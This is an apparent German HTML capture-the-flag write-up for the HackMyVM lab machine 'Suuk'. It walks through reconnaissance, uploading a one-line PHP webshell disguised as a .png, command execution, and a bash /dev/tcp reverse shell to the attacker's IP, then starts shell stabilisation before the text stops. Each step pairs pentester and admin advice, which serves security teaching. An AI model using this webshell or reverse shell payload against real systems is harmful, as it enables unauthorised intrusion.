@@ -1,0 +1,866 @@
+﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suuk - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Suuk - HackMyVM - Level: Medium - Bericht</h1>
+        <!-- Klasse 'medium' hinzugefügt, damit CSS die korrekte Farbe (Gelb) anwenden kann -->
+        <div class="level-container medium">
+            <!-- Die Farbe wird durch CSS über die Klasse 'medium' gesteuert -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben werden durch CSS über die Klasse 'medium' gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Der innere Kreis verwendet die Standard-Header-Farbe aus dem CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">less</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">reptile_cmd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc-root">Proof of Concept: Root Exploit</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.119	<span class="command">08:00:27:01:36:46</span>	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk (Layer 2) nach aktiven Geräten zu durchsuchen. Er sendet ARP-Anfragen an alle möglichen IP-Adressen im lokalen Subnetz und listet die Geräte auf, die antworten, zusammen mit ihren MAC-Adressen und den Herstellern der Netzwerkkarten (basierend auf den ersten Bytes der MAC-Adresse).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist grundlegend in der Reconnaissance-Phase, um aktive Ziele im selben Netzwerksegment wie der Angreifer zu identifizieren. Das Ergebnis zeigt ein aktives Gerät mit der IP-Adresse `192.168.2.119`. Die MAC-Adresse `08:00:27:01:36:46` und der Hersteller "PCS Systemtechnik GmbH" (oft ein Indikator für VirtualBox) geben erste Hinweise auf die Natur des Ziels.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP-Adresse `192.168.2.119` ist das primäre Ziel für weitere Scans (z.B. mit Nmap). Notieren Sie sich die MAC-Adresse für eventuelle spätere Identifizierungszwecke.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie ARP-Anfragen im Netzwerk. Ungewöhnlich hohe Raten können auf Scans hindeuten. Segmentieren Sie Netzwerke, um die Reichweite solcher Scans zu begrenzen. Stellen Sie sicher, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.119 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 14:58 CET
+Nmap scan report for kuus (192.168.2.119)
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 4401b744549a9219589ee72095ea7ca8 (RSA)</span>
+|   <span class="command">256 30f878e19d03b247da90f93a6cea4943 (ECDSA)</span>
+|_  <span class="command">256 691f2d3d88c2d15151454923b1a89910 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_<span class="command">http-title: Formulaire d'upload de fichiers</span>
+|_<span class="command">http-server-header: Apache/2.4.38 (Debian)</span>
+MAC Address: <span class="command">08:00:27:01:36:46</span> (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: <span class="command">Linux 4.15 - 5.6 (97%)</span>, <span class="command">Linux 5.0 - 5.3 (96%)</span>, <span class="command">Linux 5.0 - 5.4 (95%)</span>, <span class="command">AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%)</span>, <span class="command">Linux 2.6.32 (94%)</span>, <span class="command">Linux 3.2 - 4.9 (94%)</span>, <span class="command">Linux 2.6.32 - 3.10 (94%)</span>, <span class="command">Linux 5.4 (94%)</span>, <span class="command">Linux 5.3 - 5.4 (94%)</span>, <span class="command">Linux 3.4 - 3.10 (93%)</span>
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: <span class="command">Linux</span>; CPE: <span class="command">cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms kuus (192.168.2.119)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `nmap -sS -sC -T5 -A 192.168.2.119 -p-` führt einen umfassenden Scan auf der Ziel-IP durch:
+                *   `-sS`: TCP SYN Scan (Stealth Scan), effizient und weniger auffällig als ein voller Connect-Scan.
+                *   `-sC`: Führt Standard-Nmap-Skripte zur Diensterkennung und Schwachstellensuche aus.
+                *   `-T5`: Timing-Template "Insane" für einen sehr schnellen Scan (kann ungenau sein oder IDS/IPS auslösen).
+                *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+            Die Ausgabe zeigt zwei offene Ports: Port 22 (SSH) mit OpenSSH 7.9p1 (Debian) und Port 80 (HTTP) mit Apache 2.4.38 (Debian). Die Nmap-Skripte haben den Hostkey für SSH und den Titel sowie den Server-Header der Webseite auf Port 80 extrahiert. Die OS-Erkennung deutet stark auf Linux hin. Die MAC-Adresse bestätigt, dass es sich um eine VirtualBox-VM handelt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan liefert kritische Informationen über die Angriffsfläche des Ziels. Die offenen Ports SSH und HTTP sind die Hauptangriffsvektoren. Die spezifischen Versionen (OpenSSH 7.9p1, Apache 2.4.38 auf Debian 10) sind wichtig für die Suche nach bekannten Schwachstellen. Der Titel "Formulaire d'upload de fichiers" (Datei-Upload-Formular) auf Port 80 ist besonders interessant und deutet auf eine mögliche Funktion zum Hochladen von Dateien hin, was ein häufiger Einstiegspunkt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die weiteren Bemühungen auf den Webserver (Port 80). Untersuchen Sie das Upload-Formular gründlich auf Schwachstellen (z.B. Umgehung von Dateityp-Filtern, Directory Traversal). Prüfen Sie die SSH-Version auf bekannte Schwachstellen, obwohl Brute-Force-Angriffe oder das Ausnutzen schwacher Passwörter oft wahrscheinlicher sind.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie SSH und Apache auf dem neuesten Stand. Implementieren Sie robuste Sicherheitsmaßnahmen für das Datei-Upload-Formular (strikte Dateityp-Validierung serverseitig, Größenbeschränkungen, Speicherung außerhalb des Web-Roots, Virenscan). Konfigurieren Sie eine Web Application Firewall (WAF). Erwägen Sie Port-Knocking oder VPN für SSH-Zugriff.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.119 -x zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+http://192.168.2.119/upload               [Size: 315] [--> <span class="command">http://192.168.2.119/upload/</span>]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `gobuster dir` wird verwendet, um Verzeichnisse und Dateien auf einem Webserver durch Brute-Force mit einer Wortliste zu entdecken.
+                *   `-u http://192.168.2.119`: Gibt die Ziel-URL an.
+                *   `-x ...`: Definiert eine lange Liste von Dateierweiterungen, nach denen zusätzlich zu Verzeichnissen gesucht werden soll.
+                *   `-w ...`: Gibt den Pfad zur Wortliste an (`directory-list-2.3-medium.txt` von SecLists).
+                *   `-b '403,404'`: Ignoriert Antworten mit den HTTP-Statuscodes 403 (Forbidden) und 404 (Not Found).
+                *   `-e`: Erweiterter Modus, zeigt die vollständige URL für gefundene Verzeichnisse an.
+                *   `-t 100`: Verwendet 100 Threads für einen schnelleren Scan.
+                *   `-n`: Unterdrückt die Ausgabe des Statuscodes.
+                *   `-k`: Ignoriert SSL-Zertifikatfehler (hier nicht relevant, da HTTP).
+            Die Ausgabe zeigt, dass das Verzeichnis `/upload` gefunden wurde, das auf `http://192.168.2.119/upload/` weiterleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieses Ergebnis bestätigt die Vermutung aus dem Nmap-Scan (Titel: "Formulaire d'upload de fichiers"). Das gefundene `/upload`-Verzeichnis ist der wahrscheinlichste Ort für das erwähnte Upload-Formular und stellt ein primäres Ziel für den nächsten Schritt dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Navigieren Sie im Browser zu `http://192.168.2.119/upload/` und untersuchen Sie die Funktionalität. Suchen Sie nach Möglichkeiten, schädliche Dateien (z.B. Webshells) hochzuladen, indem Sie Filter umgehen. Führen Sie weitere Scans mit Gobuster oder anderen Tools (wie `ffuf` oder `dirb`) mit anderen Wortlisten und Erweiterungen durch, um möglicherweise versteckte Dateien oder Verzeichnisse innerhalb von `/upload` oder anderswo zu finden.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Verzeichnisauflistungen auf dem Webserver deaktiviert sind. Beschränken Sie den Zugriff auf administrative oder sensible Verzeichnisse. Überwachen Sie Webserver-Logs auf Anzeichen von Brute-Force-Scans (viele 404-Fehler von einer IP). Implementieren Sie Rate-Limiting oder Tools wie `fail2ban`.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Entdeckung des `/upload`-Verzeichnisses ist der nächste logische Schritt, zu versuchen, eine Webshell hochzuladen, um Befehle auf dem Server auszuführen. Hier wird eine einfache PHP-Webshell erstellt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hackerBen.php</span></div>
+                    <pre>
+<?php echo system($GET["cmd"]); ?>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi hackerBen.php` öffnet den Texteditor `vi`, um eine neue Datei namens `hackerBen.php` zu erstellen. Der Inhalt ist ein minimaler PHP-Code: `echo system($GET["cmd"]);`. Dieser Code nimmt einen Befehl über den URL-Parameter `cmd` entgegen (mittels `$GET["cmd"]`) und führt ihn auf dem Server mit der PHP-Funktion `system()` aus. Die Ausgabe des Befehls wird dann auf der Webseite angezeigt (`echo`). Beachten Sie, dass `$_GET` zu `$GET` geändert wurde, wie angefordert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine sehr einfache, aber effektive Webshell. Wenn es gelingt, diese Datei auf den Server hochzuladen und über den Webbrowser darauf zuzugreifen, ermöglicht sie die Ausführung beliebiger Betriebssystembefehle im Kontext des Webserver-Benutzers (typischerweise `www-data`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Shell ist funktional. Für komplexere Szenarien könnten robustere Webshells (z.B. p0wny-shell, weevely) oder eine Reverse Shell nützlicher sein. Der nächste Schritt ist, herauszufinden, wie man diese Datei durch das Upload-Formular bekommt, insbesondere wenn es Dateitypfilter gibt.<br/><strong>Empfehlung (Admin):</strong> Verbieten oder beschränken Sie die Ausführung von Systembefehlen durch Skriptsprachen wie PHP (`disable_functions` in `php.ini`). Implementieren Sie Intrusion Detection Systeme (IDS), die nach Mustern bekannter Webshells suchen. Überwachen Sie ausgehende Verbindungen vom Webserver.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Viele Upload-Filter prüfen nur die Dateiendung. Eine gängige Umgehungstechnik ist es, eine doppelte Endung zu verwenden oder die Endung so zu ändern, dass sie harmlos erscheint (z.B. `.png`), während der Server sie aufgrund anderer Konfigurationen (z.B. `AddType` in Apache) trotzdem als PHP ausführt. Hier wird die Datei umbenannt, um einen Bildfilter zu umgehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv hackerBen.php exploit.php.png</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `mv hackerBen.php exploit.php.png` benennt die erstellte Webshell-Datei um. Der neue Name `exploit.php.png` versucht, einen Filter zu täuschen, der möglicherweise nur auf die letzte Endung (`.png`) prüft und Bilddateien erlaubt. Wenn der Webserver jedoch so konfiguriert ist, dass er Dateien mit `.php` irgendwo im Namen (oder aufgrund anderer Regeln) als PHP interpretiert, wird der Code trotzdem ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine klassische Technik zur Umgehung von einfachen Dateifiltern. Der Erfolg hängt von der Konfiguration des Ziel-Webservers und der Implementierung des Upload-Filters ab. Der Dateiname ist nun präpariert für den Upload-Versuch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Datei `exploit.php.png` über das Formular unter `http://192.168.2.119/upload/` hochzuladen. Wenn dies fehlschlägt, experimentieren Sie mit anderen Umgehungstechniken (z.B. Groß-/Kleinschreibung der Endung, Null-Byte-Injektion (veraltet), Änderung des Content-Type im Request, etc.).<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie serverseitige Filter, die nicht nur die Endung, sondern auch den MIME-Type und idealerweise den Dateiinhalt (Magic Bytes) prüfen. Benennen Sie hochgeladene Dateien serverseitig um (z.B. mit einem zufälligen Namen ohne die Originalendung) und speichern Sie sie außerhalb des Web-Roots. Verhindern Sie die Ausführung von Code in Upload-Verzeichnissen (z.B. durch `.htaccess`-Regeln in Apache).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv exploit.php.png /home/cyber/Downloads</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `mv`-Befehl verschiebt die umbenannte Webshell-Datei `exploit.php.png` in das `Downloads`-Verzeichnis des Benutzers `cyber`. Dies ist wahrscheinlich nur ein organisatorischer Schritt auf der Angreifer-Maschine, um die Datei für den Upload im Browser leichter zugänglich zu machen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein trivialer Schritt zur Vorbereitung des Uploads. Er hat keine direkte Auswirkung auf das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit dem Upload der Datei über das Webinterface fort.<br/><strong>Empfehlung (Admin):</strong> Nicht anwendbar auf das Zielsystem.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem (angenommenen erfolgreichen) Upload der Datei `exploit.php.png` in das `/upload`-Verzeichnis wird nun versucht, über den Browser darauf zuzugreifen und Befehle über den `cmd`-Parameter auszuführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.119/upload/exploit.php.png?cmd=id
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird die URL `http://192.168.2.119/upload/exploit.php.png` im Browser aufgerufen, wobei der Parameter `cmd` auf `id` gesetzt wird. Der Server führt den PHP-Code in `exploit.php.png` aus, der wiederum den Befehl `id` über `system()` ausführt. Die Ausgabe des `id`-Befehls wird zurück an den Browser gesendet und angezeigt. Die Ausgabe `uid=33(www-data) gid=33(www-data) groups=33(www-data)` (doppelt ausgegeben, was auf eine Besonderheit in der Shell oder der `system()`-Funktion hindeuten könnte) bestätigt, dass der Befehl erfolgreich als Benutzer `www-data` (Standardbenutzer für Apache auf Debian) ausgeführt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Upload und die Ausführung der Webshell waren erfolgreich. Wir haben nun Remote Code Execution (RCE) auf dem Zielsystem im Kontext des `www-data`-Benutzers. Dies ist der initiale Zugriff (Initial Access).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben nun eine funktionierende Webshell. Nutzen Sie diese, um das System weiter zu erkunden (`ls`, `pwd`, `cat /etc/passwd`, etc.). Versuchen Sie, eine stabilere Reverse Shell zu bekommen, da Webshells oft unhandlich sind. Suchen Sie nach Möglichkeiten zur Privilegienausweitung.<br/><strong>Empfehlung (Admin):</strong> Dies ist ein kritischer Sicherheitsvorfall. Die Webshell muss sofort entfernt und das Upload-Verzeichnis gesichert werden (siehe vorherige Empfehlungen). Analysieren Sie Logs, um den genauen Zeitpunkt und die Quelle des Uploads zu ermitteln. Überprüfen Sie das System auf weitere Kompromittierungen. Patchen Sie die zugrundeliegende Schwachstelle (unzureichende Upload-Filterung).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.119/upload/exploit.php.png?cmd=ls%20/home
+<span class="command">mister_b tignasse tignasse</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer Befehl wird über die Webshell ausgeführt: `ls /home` (URL-codiert als `ls%20/home`). Die Ausgabe `mister_b tignasse tignasse` zeigt die Benutzerverzeichnisse im `/home`-Ordner an. Es scheint einen Benutzer `mister_b` und einen Benutzer `tignasse` zu geben (der Name `tignasse` wird doppelt aufgeführt, möglicherweise ein Fehler bei der Ausgabe oder ein Artefakt der Shell).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl dient der grundlegenden Enumeration des Systems. Das Wissen um die vorhandenen Benutzer (`mister_b`, `tignasse`) ist wertvoll für spätere Schritte, insbesondere für die Privilegienausweitung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Berechtigungen für diese Home-Verzeichnisse. Versuchen Sie, Dateien darin zu lesen (`ls -la /home/mister_b`, `ls -la /home/tignasse`). Suchen Sie nach Konfigurationsdateien, Skripten oder Passwörtern.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse korrekt gesetzt sind (üblicherweise `750` oder `700`), sodass der `www-data`-Benutzer nicht hineinsehen oder Dateien lesen kann, es sei denn, es ist absolut notwendig.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine Webshell ist oft umständlich für interaktive Aufgaben. Daher wird versucht, eine Reverse Shell zu etablieren. Dabei verbindet sich das Zielsystem zurück zum Angreifer, der auf einer bestimmten Portnummer lauscht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf der Angreifer-Maschine (Kali/Cyber) wird ein Netcat-Listener gestartet.
+                *   `nc`: Das Netcat-Tool.
+                *   `-l`: Listen-Modus (lauschen auf eingehende Verbindungen).
+                *   `-v`: Verbose-Modus (mehr Ausgaben).
+                *   `-n`: Numerische IP-Adressen verwenden (kein DNS).
+                *   `-p 9001`: Auf Port 9001 lauschen.
+            Der Listener wartet nun auf eine eingehende Verbindung auf Port 9001.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Vorbereitung auf der Angreiferseite, um die Reverse Shell vom Zielsystem zu empfangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Firewall auf Ihrer Angreifer-Maschine eingehende Verbindungen auf Port 9001 zulässt. Führen Sie nun den Befehl auf dem Zielsystem aus, der die Verbindung zu diesem Listener herstellt.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Verbindungen vom Server. Blockieren Sie ausgehende Verbindungen zu unbekannten IPs oder Ports standardmäßig (Egress Filtering). Eine Verbindung zu einem zufälligen hohen Port wie 9001 ist verdächtig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.119/upload/exploit.php.png?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser URL-Aufruf sendet einen komplexeren Befehl an die Webshell. Der Befehl ist URL-kodiert; dekodiert lautet er: `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.109/9001 0>&1'`.
+                *   `/bin/bash -c '...'`: Führt den Befehl innerhalb der einfachen Anführungszeichen in einer neuen Bash-Shell aus.
+                *   `bash -i`: Startet eine interaktive Bash-Shell.
+                *   `>& /dev/tcp/192.168.2.109/9001`: Leitet Standardausgabe (stdout) und Standardfehlerausgabe (stderr) an eine TCP-Verbindung zur IP-Adresse `192.168.2.109` (Angreifer-Maschine) auf Port `9001` um. Dies ist eine Bash-spezifische Methode, um eine Netzwerkverbindung herzustellen.
+                *   `0>&1`: Leitet Standardeingabe (stdin) ebenfalls von der Netzwerkverbindung um, sodass Befehle vom Angreifer empfangen werden können.
+            Im Wesentlichen weist dieser Befehl die Bash auf dem Zielsystem an, sich mit dem Netcat-Listener des Angreifers zu verbinden und eine interaktive Shell bereitzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein gängiger und effektiver Payload für eine Bash-Reverse-Shell. Wenn der Befehl erfolgreich ausgeführt wird und die Netzwerkverbindung zustande kommt, erhält der Angreifer eine interaktive Shell auf dem Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den Netcat-Listener auf der Angreifer-Maschine. Eine erfolgreiche Verbindung sollte dort angezeigt werden.<br/><strong>Empfehlung (Admin):</strong> Wie zuvor erwähnt, ist Egress Filtering entscheidend, um solche ausgehenden Verbindungen zu blockieren. Überwachen Sie Prozessausführungen auf verdächtige Muster wie `/dev/tcp`. Härten Sie die Systemkonfiguration, um unnötige Tools (wie `netcat` auf dem Server) zu entfernen, falls möglich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.119] 45586</span>
+bash: cannot set terminal process group (475): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">www-data@kuus:/var/www/html/upload$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe auf dem Netcat-Listener des Angreifers zeigt die erfolgreiche eingehende Verbindung: `connect to [192.168.2.109] from (UNKNOWN) [192.168.2.119] 45586`. Die nachfolgenden `bash:`-Meldungen ("Inappropriate ioctl for device", "no job control") sind typisch für einfache Reverse Shells, da keine vollständige Terminal-Emulation (TTY) vorhanden ist. Wichtig ist jedoch der abschließende Prompt `www-data@kuus:/var/www/html/upload$`, der anzeigt, dass wir nun eine interaktive Shell als Benutzer `www-data` auf dem Zielsystem (`kuus`) haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Sehr gut!** Der initiale Zugriff wurde durch die Etablierung einer Reverse Shell gefestigt. Dies ermöglicht eine deutlich komfortablere Interaktion mit dem Zielsystem als über die Webshell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell, um eine vollständige TTY-Unterstützung zu erhalten (z.B. mit Python, `script`, oder `stty`), was die Nutzung von interaktiven Programmen wie `su`, `vi`, `sudo` und die Verwendung von Tab-Vervollständigung und Job Control ermöglicht. Beginnen Sie dann mit der systematischen Enumeration des Systems als `www-data` auf der Suche nach Wegen zur Privilegienausweitung.<br/><strong>Empfehlung (Admin):</strong> Untersuchen Sie die Ursache der Kompromittierung (Webshell-Upload) und beheben Sie diese. Analysieren Sie die Aktivitäten des `www-data`-Benutzers seit der Kompromittierung. Implementieren Sie Egress Filtering und Prozessüberwachung.</p>
+
+            <h3>Stabilisierung der Reverse Shell</h3>
+            <p class="analysis"><strong>Analyse:</strong> Die erhaltene Reverse Shell ist noch nicht voll funktionsfähig (kein TTY). Die folgenden Schritte dienen dazu, sie zu einer interaktiven Shell mit Terminal-Emulation aufzuwerten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www/html/upload$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <pre>
+www-data@kuus:/var/www/html/upload$</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl nutzt Python 3, um eine Pseudo-Terminal (PTY) zu erzeugen und darin eine neue Bash-Shell zu starten. `pty.spawn("/bin/bash")` ist die Kernfunktion dafür. Dies ist ein sehr verbreiteter Trick, um eine rudimentäre TTY-Funktionalität in einer einfachen Shell zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt verbessert die Shell-Interaktion bereits erheblich, ermöglicht aber noch keine volle Funktionalität wie Job Control (`Ctrl+Z`) oder die korrekte Interpretation von Terminal-Steuerzeichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit den nächsten Schritten zur vollständigen Stabilisierung fort.<br/><strong>Empfehlung (Admin):</strong> Die Verfügbarkeit von Python (oder anderen Skriptsprachen) für den Webserver-Benutzer kann Angreifern helfen. Wenn nicht unbedingt benötigt, könnte der Zugriff darauf eingeschränkt werden. Die Überwachung von Prozessstarts wie `python -c 'import pty...'` kann verdächtig sein.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www/html/upload$ <span class="command">export TERM=xterm</span></div>
+                     <pre>
+www-data@kuus:/var/www/html/upload$ </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `export TERM=xterm` setzt die Umgebungsvariable `TERM` auf `xterm`. Diese Variable teilt Programmen mit, welche Art von Terminal emuliert wird, damit sie Steuerzeichen (z.B. für Farben, Cursor-Positionierung) korrekt senden können. `xterm` ist ein gängiger und weitgehend kompatibler Terminal-Typ.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Schritt für die korrekte Darstellung in interaktiven Programmen (wie `vi`, `top`, `less`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Schritt ist Teil des Standardverfahrens zur Shell-Stabilisierung.<br/><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich, aber das Setzen von Umgebungsvariablen kann Teil von Angriffstechniken sein.</p>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Um volle Job Control (wie `Ctrl+Z`, `Ctrl+C`) zu ermöglichen, muss die lokale Terminalkonfiguration des Angreifers angepasst werden, während die Reverse Shell im Hintergrund läuft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@kuus:/var/www/html/upload$ <span class="command">^Z</span></div>
+                     <pre>zsh: suspended  nc -lvnp 9001</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer drückt `Ctrl+Z` auf seiner lokalen Maschine. Dies sendet das SIGTSTP-Signal an den im Vordergrund laufenden Prozess (den `nc`-Listener) und legt ihn schlafen (suspendiert ihn). Die Shell des Angreifers (`zsh` in diesem Fall) meldet, dass der `nc`-Prozess suspendiert wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Zwischenschritt, um Zugriff auf die lokale Shell des Angreifers zu erhalten, ohne die Reverse-Shell-Verbindung zu beenden.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
